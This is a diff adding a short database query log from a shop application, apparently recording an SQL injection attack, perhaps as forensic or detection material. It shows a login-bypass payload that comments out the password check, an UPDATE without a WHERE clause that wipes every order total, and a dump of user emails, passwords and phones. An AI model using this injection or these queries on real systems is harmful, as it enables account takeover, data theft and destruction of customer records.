@@ -1,0 +1,6 @@
+# ts, client, query
+2026-08-14T03:13:44+09:00 app SELECT id,email,role FROM users WHERE email='admin@shop.com'--' AND password='x'
+2026-08-14T03:14:01+09:00 app SELECT * FROM orders
+2026-08-14T03:15:31+09:00 app UPDATE orders SET total=0, product='CANCELLED'   -- WHERE 절 없음: 전체 주문 조작
+2026-08-14T03:16:11+09:00 app SELECT email,password,phone FROM users
+2026-08-14T09:05:22+09:00 app SELECT * FROM products WHERE id=2
